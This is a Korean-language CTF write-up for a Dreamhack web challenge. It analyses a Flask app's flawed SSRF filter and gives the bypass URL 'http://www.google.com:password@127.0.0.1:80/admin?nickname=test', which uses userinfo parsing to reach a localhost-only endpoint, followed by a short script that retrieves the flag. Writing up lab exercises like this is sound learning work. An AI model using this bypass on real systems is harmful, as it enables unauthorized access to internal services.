---
layout: single
title: "[Dreamhack] Broken Is SSRF possible? write-up"
date: 2024-11-21 22:30 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] Broken Is SSRF possible?

<br>

### 풀이

문제 사이트에 접속하니 Not Found가 나온다.

![image-20241121225242072](/images/2024-11-21-Broken-Is-SSRF/image-20241121225242072.png)

<br>

소스코드는 아래와 같다.

```python
from flask import Flask, request, jsonify
import re
import ipaddress
import socket
import time
import hashlib
import requests
app = Flask(__name__)

flag = "d23b51c4e4d5f7c4e842476fea4be33ba8de9607dfe727c5024c66f78052b70a"

def sha256_hash(text):
    text_bytes = text.encode('utf-8')
    sha256 = hashlib.sha256()
    sha256.update(text_bytes)
    hash_hex = sha256.hexdigest()
    return hash_hex

isSafe = False
def check_ssrf(url,checked):
    global isSafe
    # if "@" in url or "#" in url:
    #     isSafe = False
    #     return "Fail"
    if checked > 3:
        print("3번을 초과하여 redirection되는 URL은 금지됩니다.")
        isSafe = False
        return "Fail"
    protocol = re.match(r'^[^:]+', url)
    if protocol is None:
        isSafe = False
        print("프로토콜이 감지되지 않았습니다.")
        return "Fail"
    print("Protocol :",protocol.group())
    if protocol.group() == "http" or protocol.group() == "https":
        host = re.search(r'(?<=//)[^/]+', url)
        print(host.group())
        if host is None:
            isSafe = False
            print("호스트가 감지되지 않았습니다.")
            return "Fail"
        host = host.group()
        if ":" in host:
            host = host.split(":")
            host = host[0]
        print("Host :",host)
        try:
            ip_address = socket.gethostbyname(host)
        except:
            print("호스트가 올바르지 않습니다.")
            isSafe = False
            return "Fail"
        for _ in range(60):
            print("IP를 검증 중입니다..", _)
            ip_address = socket.gethostbyname(host)
            if ipaddress.ip_address(ip_address).is_private:
                print("내부망 IP가 감지되었습니다. ")
                isSafe = False
                return "Fail"
            time.sleep(1) # 1초 대기
        print("리다이렉션을 확인합니다 : ",url)
        try:
            response = requests.get(url,allow_redirects=False)
            if 300 <= response.status_code and response.status_code <= 309:
                redirect_url = response.headers['location']
                print("리다이렉션이 감지되었습니다.",redirect_url)
                if len(redirect_url) >= 120:
                    isSafe = False
                    return "fail"
                check_ssrf(redirect_url,checked + 1)
        except:
            print("URL 요청에 실패했습니다.")
            isSafe = False
            return "Fail"
        if isSafe == True:
            print("URL 등록에 성공했습니다.")
            return "SUCCESS"
        else:
            return "Fail"

    else:
        print("URL이 HTTP / HTTPS로 시작하는 지 확인하세요.")
        isSafe = False
        return "Fail"

@app.route('/check-url', methods=['POST'])
def check_url():
    global isSafe
    data = request.get_json()
    if 'url' not in data:
        return jsonify({'error': 'No URL provided'}), 400

    url = data['url']
    host = re.search(r'(?<=//)[^/]+', url)
    print(host.group())
    if host is None:
        print("호스트가 감지되지 않았습니다.")
        return "Fail"
    host = host.group()
    if ":" in host:
        host = host.split(":")
        host = host[0]
    if host != "www.google.com":
        isSafe = False
        return "Host는 반드시 www.google.com이어야 합니다."
    isSafe = True
    result = check_ssrf(url,1)
    if result != "SUCCESS" or isSafe != True:
        return "SSRF를 일으킬 수 있는 URL입니다."
    try:
        response = requests.get(url)
        status_code = response.status_code
        return jsonify({'url': url, 'status_code': status_code})
    except requests.exceptions.RequestException as e:
        return jsonify({'error': 'Request Failed.'}), 500
    
@app.route('/admin',methods=['GET'])
def admin():
    global flag
    user_ip = request.remote_addr
    if user_ip != "127.0.0.1":
        return "only localhost."
    if request.args.get('nickname'):
        nickname = request.args.get('nickname')
        flag = sha256_hash(nickname)
        return "success."

@app.route("/flag",methods=['POST'])
def clear():
    global flag
    if flag == sha256_hash(request.args.get('nickname')):
        return "DH{REDACTED}"
    else:
        return "you can't bypass SSRF-FILTER zzlol 😛"

if __name__ == '__main__':
    print("Hash : ",sha256_hash("당신의 창의적인 공격 아이디어를 보여주세요!"))
    app.run(debug=False,host='0.0.0.0',port=80)

```

<br>

`sha256_hash` 함수를 살펴보면 문자열을 utf-8로 인코딩하여 바이트 객체로 변환한다. 여기서 해시 알고리즘은 문자열이 아닌 바이트 데이터로 처리해야 한다. 따라서  hashlib으로 sha256 객체를 생성하고 update로 입력된 데이터를 해시 객체에 추가하여 16진수 문자열로 반환하는 것을 알 수 있다.

```python
def sha256_hash(text):
    text_bytes = text.encode('utf-8')
    sha256 = hashlib.sha256()
    sha256.update(text_bytes)
    hash_hex = sha256.hexdigest()
    return hash_hex
```

<br>`check_ssrf` 함수를 분석해보면 전에 isSafe라는 변수에 Flase를 저장해놓고 이를 전역 변수로 사용하고 있다. 인자로는 url과  checked를 받고 있고, checked가 3번이 넘어가면 Fail 문자열을 리턴하면서 리다이렉션되는 횟수가 3번까지 제한하고 있는 것 같다. `protocol` 변수에는 정규표현식을 사용해 `:` 전까지의 문자열들을 뽑아와서 http또는 https를 불러와 값이 없다면 Fail을 반환하고, `group()` 를 이용해 정규표현식의 전체 매칭된 문자열을 print해주고 있다. 또한 http 또는 https라면 정규표현식을 사용하여 도메인 부분만 뽑아와 print 한다. 아래는 `socket.gethostbyname` 을 사용해 도메인 이름을 IP 주소로 변환한다. 그리고 ipaddress 모듈을 사용해 변환된 IP주소가 내부망 IP라면 Fail을 반환한다. 다음으로 요청이 300~309 응답 코드 사이라면 location 헤더에서 url을 가져와 `check_ssrf` 함수를 호출하고 `checked`를 1 증가시킨다. 모든 검사를 통과하면 URL 등록에 성공했다는 문자열과 `SUCCESS` 를 반환한다.

```py
isSafe = False
def check_ssrf(url,checked):
    global isSafe
    # if "@" in url or "#" in url:
    #     isSafe = False
    #     return "Fail"
    if checked > 3:
        print("3번을 초과하여 redirection되는 URL은 금지됩니다.")
        isSafe = False
        return "Fail"
    protocol = re.match(r'^[^:]+', url)
    if protocol is None:
        isSafe = False
        print("프로토콜이 감지되지 않았습니다.")
        return "Fail"
    print("Protocol :",protocol.group())
    if protocol.group() == "http" or protocol.group() == "https":
        host = re.search(r'(?<=//)[^/]+', url)
        print(host.group())
        if host is None:
            isSafe = False
            print("호스트가 감지되지 않았습니다.")
            return "Fail"
        host = host.group()
        if ":" in host:
            host = host.split(":")
            host = host[0]
        print("Host :",host)
        try:
            ip_address = socket.gethostbyname(host)
        except:
            print("호스트가 올바르지 않습니다.")
            isSafe = False
            return "Fail"
        for _ in range(60):
            print("IP를 검증 중입니다..", _)
            ip_address = socket.gethostbyname(host)
            if ipaddress.ip_address(ip_address).is_private:
                print("내부망 IP가 감지되었습니다. ")
                isSafe = False
                return "Fail"
            time.sleep(1) # 1초 대기
        print("리다이렉션을 확인합니다 : ",url)
        try:
            response = requests.get(url,allow_redirects=False)
            if 300 <= response.status_code and response.status_code <= 309:
                redirect_url = response.headers['location']
                print("리다이렉션이 감지되었습니다.",redirect_url)
                if len(redirect_url) >= 120:
                    isSafe = False
                    return "fail"
                check_ssrf(redirect_url,checked + 1)
        except:
            print("URL 요청에 실패했습니다.")
            isSafe = False
            return "Fail"
        if isSafe == True:
            print("URL 등록에 성공했습니다.")
            return "SUCCESS"
        else:
            return "Fail"

    else:
        print("URL이 HTTP / HTTPS로 시작하는 지 확인하세요.")
        isSafe = False
        return "Fail"
```

<br>

`check-url` 엔드포인트를 분석하면 POST 메소드만 허용하고 있고, `check_url` 함수에서 요청된 JSON 데이터를 파싱하여 `url` 이 포함되지 않은 경우 400 코드와 함께 에러 메시지를 반환한다. 아래에는 url에서 도메인을 뽑아와서 `www.google.com` 이 아닌 경우 `isSafe` 값이 False가 되며 `check_ssrf` 함수를 호출하고 있다. 안전한 URL로 판단된 경우 GET 요청을 보내고 상태 코드를 반환하고 요청이 실패하면 500에러를 반환한다. 따라서 `/check-url` 경로는 키가 url인 JSON 데이터를 POST 요청으로 전송해야 한다.

```python
@app.route('/check-url', methods=['POST'])
def check_url():
    global isSafe
    data = request.get_json()
    if 'url' not in data:
        return jsonify({'error': 'No URL provided'}), 400

    url = data['url']
    host = re.search(r'(?<=//)[^/]+', url)
    print(host.group())
    if host is None:
        print("호스트가 감지되지 않았습니다.")
        return "Fail"
    host = host.group()
    if ":" in host:
        host = host.split(":")
        host = host[0]
    if host != "www.google.com":
        isSafe = False
        return "Host는 반드시 www.google.com이어야 합니다."
    isSafe = True
    result = check_ssrf(url,1)
    if result != "SUCCESS" or isSafe != True:
        return "SSRF를 일으킬 수 있는 URL입니다."
    try:
        response = requests.get(url)
        status_code = response.status_code
        return jsonify({'url': url, 'status_code': status_code})
    except requests.exceptions.RequestException as e:
        return jsonify({'error': 'Request Failed.'}), 500
```

<br>

`/admin` 엔드포인트를 살펴보면 `request.remote_addr`을 통해서 클라이언트의  IP를 가져오고 IP가 127.0.0.1이 아니라면  only localhost를 리턴한다. 또한  nickname이라는 파라미터를 받아와서 `sha256_hash`를 통해 생긴 16진수 문자열을 flag 변수에 저장하고 success를 리턴한다. `/flag` 엔드포인트에서는 admin에서 등록된 nickname 파라미터 값을 입력해주면 플래그를 리턴해주는 것 같다.

```python
@app.route('/admin',methods=['GET'])
def admin():
    global flag
    user_ip = request.remote_addr
    if user_ip != "127.0.0.1":
        return "only localhost."
    if request.args.get('nickname'):
        nickname = request.args.get('nickname')
        flag = sha256_hash(nickname)
        return "success."

@app.route("/flag",methods=['POST'])
def clear():
    global flag
    if flag == sha256_hash(request.args.get('nickname')):
        return "DH{REDACTED}"
    else:
        return "you can't bypass SSRF-FILTER zzlol 😛"
```

<br>

먼저 이 문제에서 익스플로잇 방법을 간단히 보면 `/check-url` 엔드포인트에서 JSON 구조로 url을 넣어주고 HOST가 `www.google.com`이면서 `check_ssrf`에 맞게 스킴을 입력해주고 호스트를 IP로 변환했을 때 내부망 IP(10.x.x.x, 192.168.x.x, 172.16.x.x~172.31.x.x)이 아니면서 리다이렉션이 3번 까지만 허용되면 된다. 

<br>

따라서 간단하게 정리해보면 아래와 같다.

1. /check-url 엔드포인트에서 JSON 구조로 호스트가 `www.google.com`인 url 요청해야 함.
2. check_ssrf 조건에 맞게 스킴이랑 URL 주소를 내부망 IP로 변환했을 때 내부망 IP면 안됨 (리다이렉션 3번까지 허용).
3. /admin 엔드포인트에서 요청 IP가 127.0.0.1이면서 nickname 파라미터 값까지 입력해서 flag 값 등록
4. /flag 엔드포인트에서 POST 메소드로 nickname 파라미터 입력해서 flag 값 획득

<br>

테스트해보기 위해서 버프로 `/check-url` 엔드포인트에 url을 json 형태로 넣어주기 위해서는 먼저 메소드를 POST만 허용해주고 있기 때문에 POST로 바꿔주고 POST 메소드로 보내게 되면 Content-Type 헤더를 지정해주어야 한다. json 데이터를 보내야하기 때문에 application/json 값을 넣어주고 url 값을 `http://www.google.com` 으로 넣어주어 조금 기다리면 200 응답 값이 잘 온 것을 확인할 수 있다.

![image-20241123214940926](/images/2024-11-21-Broken-Is-SSRF/image-20241123214940926.png)

<br>

다음 부분에서 조금 헤맸는데 URI 구조에 대해서 다시 한 번 살펴볼 필요가 있었다. URI 구조는 우선 아래와 같다.

```
sheme://username:password@host:port/path
```

<br>

위 URI 구조를 활용해서 아래와 같이 `check-url` 엔드포인트에 값을 주게 되면 브라우저는 `@`를 기준으로 앞에 있는 요소로 user:password로 입력받고 처리하지만 코드 상으로는 `www.google.com` 이 호스트가 된다. `admin` 엔드포인트에서 nickname 파라미터까지 같이 요청해주면 된다. http를 사용한 이유는 앞에 있는 username:password 부분이 짤리게 되면서 127.0.0.1이 앞으로 오게 되는데 루프백 주소이므로 http로 작성해주었다.

```
http://www.google.com:password@127.0.0.1:80/admin?nickname=test
```

![image-20241123214558192](/images/2024-11-21-Broken-Is-SSRF/image-20241123214558192.png)

<br>

위와 같이 url을 `test` 로 등록해주었다면 아래와 같이 parmas를 `test` 로 설정해주고 요청을 보내면 아래와 같이  flag를 획득한 것을 볼 수 있다.

```python
import requests

url = "http://host3.dreamhack.games:12573/flag"
params = {
    "nickname": "test"
}

response = requests.post(url, params=params)

if response.status_code == 200:
    print("응답:", response.text)
else:
    print(f"오류 {response.status_code}: {response.text}")
```

![스크린샷 2024-11-24 오전 3.09.00](/images/2024-11-21-Broken-Is-SSRF/스크린샷 2024-11-24 오전 3.09.00.png)
